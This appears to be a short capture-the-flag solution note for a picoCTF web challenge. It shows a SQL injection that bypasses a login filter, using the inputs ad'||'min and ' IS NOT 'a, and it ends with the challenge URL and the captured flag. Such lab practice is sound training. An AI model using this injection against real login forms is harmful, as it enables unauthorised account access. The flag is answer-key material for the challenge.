@@ -1,0 +1,8 @@
+SELECT username, password FROM users WHERE username='ad'||'min' AND password='' IS NOT 'a'
+
+Username: ad'||'min
+Password: ' IS NOT 'a
+
+http://wily-courier.picoctf.net:62614/filter.php
+
+picoCTF{0n3_m0r3_t1m3_85a265ac}
